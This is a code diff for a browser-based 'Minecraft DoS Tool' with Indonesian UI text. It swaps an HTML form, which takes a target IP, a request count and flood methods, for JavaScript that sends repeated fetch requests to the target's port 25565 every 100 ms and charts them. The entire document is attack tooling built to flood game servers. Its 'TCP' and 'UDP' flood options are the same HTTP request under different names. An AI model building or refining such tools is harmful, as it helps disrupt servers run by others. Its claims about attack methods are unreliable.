@@ -1,38 +1,65 @@
-<!DOCTYPE html>
-<html lang="id">
-<head>
-    <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Minecraft DoS Tool</title>
-    <link rel="stylesheet" href="style.css">
-    <script src="https://cdn.jsdelivr.net/npm/chart.js"></script>
-</head>
-<body>
-    <div class="container">
-        <h1>Minecraft DoS Tool</h1>
+let attackInterval;
+let attackCount = 0;
 
-        <label>Server IP:</label>
-        <input type="text" id="serverIP" placeholder="Contoh: 127.0.0.1">
+// Inisialisasi grafik
+const ctx = document.getElementById('attackChart').getContext('2d');
+const attackChart = new Chart(ctx, {
+    type: 'line',
+    data: {
+        labels: [],
+        datasets: [{
+            label: 'Requests Sent',
+            borderColor: 'red',
+            backgroundColor: 'rgba(255, 0, 0, 0.2)',
+            data: []
+        }]
+    },
+    options: { responsive: true }
+});
 
-        <label>Jumlah Request:</label>
-        <input type="number" id="requestCount" placeholder="1000">
+function updateChart() {
+    attackChart.data.labels.push(attackCount);
+    attackChart.data.datasets[0].data.push(attackCount);
+    attackChart.update();
+}
 
-        <label>Metode Serangan:</label>
-        <select id="attackMethod">
-            <option value="ping">Ping Flood</option>
-            <option value="tcp">TCP Flood</option>
-            <option value="udp">UDP Flood</option>
-            <option value="bot">Bot Spam</option>
-        </select>
+function startAttack() {
+    let serverIP = document.getElementById("serverIP").value;
+    let requestCount = parseInt(document.getElementById("requestCount").value);
+    let attackMethod = document.getElementById("attackMethod").value;
+    let statusDiv = document.getElementById("status");
 
-        <button onclick="startAttack()">Start Attack</button>
-        <button onclick="stopAttack()">Stop Attack</button>
+    if (!serverIP || requestCount <= 0) {
+        alert("Masukkan IP dan jumlah request yang valid!");
+        return;
+    }
 
-        <div id="status">Status: Ready</div>
+    attackCount = 0;
+    statusDiv.innerHTML = "Menyerang " + serverIP + " dengan " + attackMethod;
 
-        <canvas id="attackChart"></canvas>
-    </div>
+    attackInterval = setInterval(() => {
+        if (attackCount >= requestCount) {
+            clearInterval(attackInterval);
+            statusDiv.innerHTML = "Serangan selesai!";
+            return;
+        }
 
-    <script src="attack.js"></script>
-</body>
-</html>
+        if (attackMethod === "ping") {
+            fetch(`http://${serverIP}:25565/ping`).catch(() => {});
+        } else if (attackMethod === "tcp") {
+            fetch(`http://${serverIP}:25565/tcp`).catch(() => {});
+        } else if (attackMethod === "udp") {
+            fetch(`http://${serverIP}:25565/udp`).catch(() => {});
+        } else if (attackMethod === "bot") {
+            fetch(`http://${serverIP}:25565/bot`).catch(() => {});
+        }
+
+        attackCount++;
+        updateChart();
+    }, 100);
+}
+
+function stopAttack() {
+    clearInterval(attackInterval);
+    document.getElementById("status").innerHTML = "Serangan dihentikan!";
+}
